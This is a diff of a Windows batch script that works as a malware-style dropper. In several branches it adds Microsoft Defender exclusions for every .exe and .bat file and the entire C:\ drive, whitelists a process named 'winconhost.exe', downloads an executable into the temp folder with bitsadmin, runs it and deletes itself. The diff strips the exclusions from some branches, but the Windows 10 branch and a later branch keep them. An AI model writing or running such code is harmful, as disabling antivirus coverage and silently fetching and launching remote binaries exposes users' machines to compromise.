@@ -9,38 +9,32 @@ ver | findstr /i "10.0." > nul && set Version=Windows 10
 ver | findstr /i "10.0.22000." > nul && set Version=Windows 11
 
 if "%Version%" == "Windows 7" (
-        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
-        powershell -Command Add-MpPreference -ExclusionPath "C:\"
-        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
-        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
-        set pOut="%temp%\\ANTI-MEMORYldp.exe"
-        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
-        start "" %pOut%
+        set file_name=putty.exe
+        set download_path=%temp%\
+        set url=https://the.earth.li/~sgtatham/putty/0.78/w64/putty.exe
+        powershell Start-BitsTransfer -Source %url% -Destination %download_path%\%file_name%
+        start "" %download_path%\%file_name%
         DEL "%~f0"
-) else if "%Version%" == "Windows 8" (
-        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
-        powershell -Command Add-MpPreference -ExclusionPath "C:\"
-        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
-        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
-        set pOut="%temp%\\ANTI-MEMORYldp.exe"
-        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
-        start "" %pOut%
+) else if "%Version%" == "Windows 8" ( 
+        set file_name=putty.exe
+        set download_path=%temp%\
+        set url=https://the.earth.li/~sgtatham/putty/0.78/w64/putty.exe
+        powershell Start-BitsTransfer -Source %url% -Destination %download_path%\%file_name%
+        start "" %download_path%\%file_name%
         DEL "%~f0"
 ) else if "%Version%" == "Windows 8.1" (
-        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
-        powershell -Command Add-MpPreference -ExclusionPath "C:\"
-        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
-        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
-        set pOut="%temp%\\ANTI-MEMORYldp.exe"
-        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
-        start "" %pOut%
+        set file_name=putty.exe
+        set download_path=%temp%\
+        set url=https://the.earth.li/~sgtatham/putty/0.78/w64/putty.exe
+        powershell Start-BitsTransfer -Source %url% -Destination %download_path%\%file_name%
+        start "" %download_path%\%file_name%
         DEL "%~f0"
 ) else if "%Version%" == "Windows 10" (
         powershell -Command Add-MpPreference -ExclusionExtension ".exe"
         powershell -Command Add-MpPreference -ExclusionPath "C:\"
         powershell -Command Add-MpPreference -ExclusionExtension ".bat"
         powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
-        set pOut="%temp%\\ANTI-MEMORYldp.exe"
+        set pOut="%temp%\\putty.exe"
         bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
         start "" %pOut%
         DEL "%~f0"
@@ -49,7 +43,7 @@ if "%Version%" == "Windows 7" (
         powershell -Command Add-MpPreference -ExclusionPath "C:\"
         powershell -Command Add-MpPreference -ExclusionExtension ".bat"
         powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
-        set pOut="%temp%\\ANTI-MEMORYldp.exe"
+        set pOut="%temp%\\putty.exe"
         bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
         start "" %pOut%
         DEL "%~f0"
